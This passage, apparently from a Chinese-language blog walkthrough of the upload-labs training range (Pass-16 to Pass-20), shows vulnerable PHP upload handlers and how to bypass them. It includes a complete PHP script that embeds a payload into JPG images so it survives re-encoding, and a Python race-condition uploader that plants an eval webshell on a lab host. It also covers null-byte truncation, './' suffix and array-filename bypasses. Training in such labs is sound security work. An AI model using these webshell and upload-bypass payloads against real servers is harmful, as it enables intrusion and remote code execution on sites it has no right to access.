class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    /*</span><br><span class="line"></span><br><span class="line">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br><span class="line">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class="line"></span><br><span class="line">    1) Upload an arbitrary image via secured files upload script</span><br><span class="line">    2) Save the processed image and launch:</span><br><span class="line">    jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="line"></span><br><span class="line">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class="line"></span><br><span class="line">    Since the most straightforward injection method is used, the following problems can occur:</span><br><span class="line">    1) After the second processing the injected data may become partially corrupted.</span><br><span class="line">    2) The jpg_payload.php script outputs &quot;Something&apos;s wrong&quot;.</span><br><span class="line">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class="line"></span><br><span class="line">    Sergey Bobrov @Black2Fan.</span><br><span class="line"></span><br><span class="line">    See also:</span><br><span class="line">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br><span class="line"></span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if(!extension_loaded(&apos;gd&apos;) || !function_exists(&apos;imagecreatefromjpeg&apos;)) &#123;</span><br><span class="line">        die(&apos;php-gd is not installed&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!isset($argv[1])) &#123;</span><br><span class="line">        die(&apos;php jpg_payload.php &lt;jpg_name.jpg&gt;&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(&quot;custom_error_handler&quot;);</span><br><span class="line"></span><br><span class="line">    for($pad = 0; $pad &lt; 1024; $pad++) &#123;</span><br><span class="line">        $nullbytePayloadSize = $pad;</span><br><span class="line">        $dis = new DataInputStream($argv[1]);</span><br><span class="line">        $outStream = file_get_contents($argv[1]);</span><br><span class="line">        $extraBytes = 0;</span><br><span class="line">        $correctImage = TRUE;</span><br><span class="line"></span><br><span class="line">        if($dis-&gt;readShort() != 0xFFD8) &#123;</span><br><span class="line">            die(&apos;Incorrect SOI marker&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;</span><br><span class="line">            $marker = $dis-&gt;readByte();</span><br><span class="line">            $size = $dis-&gt;readShort() - 2;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            if($marker === 0xDA) &#123;</span><br><span class="line">                $startPos = $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp = </span><br><span class="line">                    substr($outStream, 0, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . </span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(&apos;_&apos;.$argv[1], $outStreamTmp, TRUE);</span><br><span class="line">                if($extraBytes !== 0) &#123;</span><br><span class="line">                    while((!$dis-&gt;eof())) &#123;</span><br><span class="line">                        if($dis-&gt;readByte() === 0xFF) &#123;</span><br><span class="line">                            if($dis-&gt;readByte !== 0x00) &#123;</span><br><span class="line">                                break;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $stopPos = $dis-&gt;seek() - 2;</span><br><span class="line">                    $imageStreamSize = $stopPos - $startPos;</span><br><span class="line">                    $outStream = </span><br><span class="line">                        substr($outStream, 0, $startPos) . </span><br><span class="line">                        $miniPayload . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            0,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                &#125; elseif($correctImage) &#123;</span><br><span class="line">                    $outStream = $outStreamTmp;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                if(checkImage(&apos;payload_&apos;.$argv[1], $outStream)) &#123;</span><br><span class="line">                    die(&apos;Success!&apos;);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(&apos;payload_&apos;.$argv[1]);</span><br><span class="line">    die(&apos;Something\&apos;s wrong&apos;);</span><br><span class="line"></span><br><span class="line">    function checkImage($filename, $data, $unlink = FALSE) &#123;</span><br><span class="line">        global $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage = TRUE;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        if($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        return $correctImage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;</span><br><span class="line">        global $extraBytes, $correctImage;</span><br><span class="line">        $correctImage = FALSE;</span><br><span class="line">        if(preg_match(&apos;/(\d+) extraneous bytes before marker/&apos;, $errstr, $m)) &#123;</span><br><span class="line">            if(isset($m[1])) &#123;</span><br><span class="line">                $extraBytes = (int)$m[1];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class DataInputStream &#123;</span><br><span class="line">        private $binData;</span><br><span class="line">        private $order;</span><br><span class="line">        private $size;</span><br><span class="line"></span><br><span class="line">        public function __construct($filename, $order = false, $fromString = false) &#123;</span><br><span class="line">            $this-&gt;binData = &apos;&apos;;</span><br><span class="line">            $this-&gt;order = $order;</span><br><span class="line">            if(!$fromString) &#123;</span><br><span class="line">                if(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    die(&apos;File not exists [&apos;.$filename.&apos;]&apos;);</span><br><span class="line">                $this-&gt;binData = file_get_contents($filename);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $this-&gt;binData = $filename;</span><br><span class="line">            &#125;</span><br><span class="line">            $this-&gt;size = strlen($this-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function seek() &#123;</span><br><span class="line">            return ($this-&gt;size - strlen($this-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function skip($skip) &#123;</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, $skip);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function readByte() &#123;</span><br><span class="line">            if($this-&gt;eof()) &#123;</span><br><span class="line">                die(&apos;End Of File&apos;);</span><br><span class="line">            &#125;</span><br><span class="line">            $byte = substr($this-&gt;binData, 0, 1);</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, 1);</span><br><span class="line">            return ord($byte);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function readShort() &#123;</span><br><span class="line">            if(strlen($this-&gt;binData) &lt; 2) &#123;</span><br><span class="line">                die(&apos;End Of File&apos;);</span><br><span class="line">            &#125;</span><br><span class="line">            $short = substr($this-&gt;binData, 0, 2);</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, 2);</span><br><span class="line">            if($this-&gt;order) &#123;</span><br><span class="line">                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);</span><br><span class="line">            &#125;</span><br><span class="line">            return $short;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function eof() &#123;</span><br><span class="line">            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>随便找张jpg的图片然后 命名为1.jpg<br><img src="https://i.imgur.com/FwTikCN.png" alt=""></p><p>然后使用脚本处理1.jpg,命令php jpg_payload.php 1.jpg然而貌似不可以最后会出现错误 原因未知<br>展示下其他方法<br>改gif的简单 上传一个gif图片<br>用winhex对比 视图 同步比较<br>在没有变化的地方添加 一句话木马<br>上传即成功<br><img src="https://i.imgur.com/M4zrgbG.png" alt=""><br><img src="https://i.imgur.com/ADmnOJV.png" alt=""><br>嗯，小别致可真东西</p><h3 id="Pass-017-条件竞争"><a href="#Pass-017-条件竞争" class="headerlink" title="Pass-017  条件竞争"></a>Pass-017  条件竞争</h3><p>看下源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">    $ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);</span><br><span class="line">    $file_name = $_FILES[&apos;upload_file&apos;][&apos;name&apos;];</span><br><span class="line">    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);</span><br><span class="line">    $upload_file = UPLOAD_PATH . &apos;/&apos; . $file_name;</span><br><span class="line"></span><br><span class="line">    if(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . &apos;/&apos;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = true;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg = &apos;上传出错！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>看了这个源码，我一度怀疑这个题目是不是出错了？这个不是只是一个白名单吗？直接上传一个jpg/png/gif的马不就好了吗？<br>尝试下，直接上传成功<br><img src="https://i.imgur.com/991HKr1.png" alt=""><br>然而这个题目本意并非如此，因为上传的图片会被改名<br>我们如何上传一个不会改名的图片呢？<br>这里可以使用竞争上传的方式去突破，同时使用多个进程去上传php文件，php文件的内容是向服务器目录下写一个webshell，之后不断去去访问上传的php文件，如果在删除该php文件之前访问到了该php文件，就会向服务器目录写一个webshell，用python去实现多进程上传<br>详细来自<a href="http://lawlietweb.com/2018/06/07/upload-labs/#%E7%AC%AC%E5%8D%81%E5%85%AD%E5%85%B3" target="_blank" rel="noopener">这里</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">from multiprocessing import Pool</span><br><span class="line">def CompeteUpload(list):</span><br><span class="line">    url=&quot;http://192.168.242.128/upload-labs/Pass-17/index.php&quot;</span><br><span class="line">    geturl=&quot;http://192.168.242.128/upload-labs/upload/info.php&quot;</span><br><span class="line">    file=&#123;&apos;upload_file&apos;:(&apos;info.php&apos;,&quot;&lt;?php fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_POST[ironman]);?&gt;&apos;);?&gt;&quot;,&apos;image/jpeg&apos;)&#125;</span><br><span class="line">    data=&#123;&apos;submit&apos;:&apos;上传&apos;&#125;</span><br><span class="line">    r=requests.post(url=url,data=data,files=file)</span><br><span class="line">    #print &quot;test upload....&quot;</span><br><span class="line">    r1=requests.get(url=geturl)</span><br><span class="line">    if r1.status_code==200:</span><br><span class="line">        print &quot;upload success!&quot;</span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    pool = Pool(10)</span><br><span class="line">    pool.map(CompeteUpload, range(10000))</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/TY1fzHj.png" alt=""><br>上传成功，<br>当然我们也可以通过Burpsuit进行暴力上传这里就不演示了</p><h3 id="Pass-018-条件竞争"><a href="#Pass-018-条件竞争" class="headerlink" title="Pass-018  条件竞争"></a>Pass-018  条件竞争</h3><p>源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">//index.php</span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&apos;submit&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    require_once(&quot;./myupload.php&quot;);</span><br><span class="line">    $imgFileName =time();</span><br><span class="line">    $u = new MyUpload($_FILES[&apos;upload_file&apos;][&apos;name&apos;], $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $_FILES[&apos;upload_file&apos;][&apos;size&apos;],$imgFileName);</span><br><span class="line">    $status_code = $u-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    switch ($status_code) &#123;</span><br><span class="line">        case 1:</span><br><span class="line">            $is_upload = true;</span><br><span class="line">            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;</span><br><span class="line">            break;</span><br><span class="line">        case 2:</span><br><span class="line">            $msg = &apos;文件已经被上传，但没有重命名。&apos;;</span><br><span class="line">            break; </span><br><span class="line">        case -1:</span><br><span class="line">            $msg = &apos;这个文件不能上传到服务器的临时文件存储目录。&apos;;</span><br><span class="line">            break; </span><br><span class="line">        case -2:</span><br><span class="line">            $msg = &apos;上传失败，上传目录不可写。&apos;;</span><br><span class="line">            break; </span><br><span class="line">        case -3:</span><br><span class="line">            $msg = &apos;上传失败，无法上传该类型文件。&apos;;</span><br><span class="line">            break; </span><br><span class="line">        case -4:</span><br><span class="line">            $msg = &apos;上传失败，上传的文件过大。&apos;;</span><br><span class="line">            break; </span><br><span class="line">        case -5:</span><br><span class="line">            $msg = &apos;上传失败，服务器已经存在相同名称文件。&apos;;</span><br><span class="line">            break; </span><br><span class="line">        case -6:</span><br><span class="line">            $msg = &apos;文件无法上传，文件不能复制到目标目录。&apos;;</span><br><span class="line">            break;      </span><br><span class="line">        default:</span><br><span class="line">            $msg = &apos;未知错误！&apos;;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//myupload.php</span><br><span class="line">class MyUpload&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  var $cls_arr_ext_accepted = array(</span><br><span class="line">      &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;,</span><br><span class="line">      &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  /** upload()</span><br><span class="line">   **</span><br><span class="line">   ** Method to upload the file.</span><br><span class="line">   ** This is the only method to call outside the class.</span><br><span class="line">   ** @para String name of directory we upload to</span><br><span class="line">   ** @returns void</span><br><span class="line">  **/</span><br><span class="line">  function upload( $dir )&#123;</span><br><span class="line">    </span><br><span class="line">    $ret = $this-&gt;isUploadedFile();</span><br><span class="line">    </span><br><span class="line">    if( $ret != 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = $this-&gt;setDir( $dir );</span><br><span class="line">    if( $ret != 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = $this-&gt;checkExtension();</span><br><span class="line">    if( $ret != 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = $this-&gt;checkSize();</span><br><span class="line">    if( $ret != 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // if flag to check if the file exists is set to 1</span><br><span class="line">    </span><br><span class="line">    if( $this-&gt;cls_file_exists == 1 )&#123;</span><br><span class="line">      </span><br><span class="line">      $ret = $this-&gt;checkFileExists();</span><br><span class="line">      if( $ret != 1 )&#123;</span><br><span class="line">        return $this-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // if we are here, we are ready to move the file to destination</span><br><span class="line"></span><br><span class="line">    $ret = $this-&gt;move();</span><br><span class="line">    if( $ret != 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // check if we need to rename the file</span><br><span class="line"></span><br><span class="line">    if( $this-&gt;cls_rename_file == 1 )&#123;</span><br><span class="line">      $ret = $this-&gt;renameFile();</span><br><span class="line">      if( $ret != 1 )&#123;</span><br><span class="line">        return $this-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // if we are here, everything worked as planned :)</span><br><span class="line"></span><br><span class="line">    return $this-&gt;resultUpload( &quot;SUCCESS&quot; );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>嗯图片马再次上传成功<br>这里大概是采取白名单的形式<br><img src="https://i.imgur.com/KOJ9FHE.png" alt=""><br>我们可以看到move在rename的前面<br>所以我们可以采取竞争的形式上传shell<br>具体不演示了</p><h3 id="Pass-019-00截断-过滤"><a href="#Pass-019-00截断-过滤" class="headerlink" title="Pass-019  00截断/./过滤"></a>Pass-019  00截断/./过滤</h3><p>源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[&apos;save_name&apos;];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        if(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">            $img_path = UPLOAD_PATH . &apos;/&apos; .$file_name;</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $msg = &apos;上传出错！&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $msg = &apos;禁止保存为该类型文件！&apos;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>以一种黑名单的形式进行限制，我们可以采取apache解析漏洞，话说apache解析漏洞在2.4以上版本好像就不怎么好用了，<br>当然也可以用move_uploaded_file函数的00截断漏洞绕过。<br>具体如下CVE-2015-2348<br>当然还有一种方法就是文件名后缀加./ move_uploaded_file这个函数遇到./就会忽略<br><img src="https://i.imgur.com/rq59afC.png" alt=""><br>上传成功</p><p><a href="https://www.cnblogs.com/cyjaysun/p/4390930.html" target="_blank" rel="noopener">https://www.cnblogs.com/cyjaysun/p/4390930.html</a><br>漏洞绕过<br>不过这个条件貌似有点苛刻，反正我本地的环境是上传不了的</p><h3 id="Pass-20-数组-绕过"><a href="#Pass-20-数组-绕过" class="headerlink" title="Pass-20-数组+/.绕过"></a>Pass-20-数组+/.绕过</h3><p>源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(!empty($_FILES[&apos;upload_file&apos;]))&#123;</span><br><span class="line">    //检查MIME</span><br><span class="line">    $allow_type = array(&apos;image/jpeg&apos;,&apos;image/png&apos;,&apos;image/gif&apos;);</span><br><span class="line">    if(!in_array($_FILES[&apos;upload_file&apos;][&apos;type&apos;],$allow_type))&#123;</span><br><span class="line">        $msg = &quot;禁止上传该类型文件!&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        //检查文件名</span><br><span class="line">        $file = empty($_POST[&apos;save_name&apos;]) ? $_FILES[&apos;upload_file&apos;][&apos;name&apos;] : $_POST[&apos;save_name&apos;];</span><br><span class="line">        if (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(&apos;.&apos;, strtolower($file));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ext = end($file);</span><br><span class="line">        $allow_suffix = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);</span><br><span class="line">        if (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = &quot;禁止上传该后缀文件!&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $file_name = reset($file) . &apos;.&apos; . $file[count($file) - 1];</span><br><span class="line">            $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">            $img_path = UPLOAD_PATH . &apos;/&apos; .$file_name;</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = &quot;文件上传成功！&quot;;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &quot;文件上传失败！&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $msg = &quot;请选择要上传的文件！&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>很明显这是采取白名单的形式进行过滤<br>首先先判断文件的类型<br>通过<br><img src="https://i.imgur.com/x3CisCu.png" alt=""><br>进行获取文件的文件名<br>这里是判断文件是否为数组<br>我们可以使文件名为数组进行绕过</p><blockquote><p>end - 将数组的内部指针设置为其最后一个元素</p></blockquote><p>例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$fruits = array(&apos;apple&apos;, &apos;banana&apos;, &apos;cranberry&apos;);</span><br><span class="line">echo end($fruits); // cranberry</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>所以我们可以令数组的最后一个元素为jpg等进行绕过<br>这里会将文件进行重命名<br><img 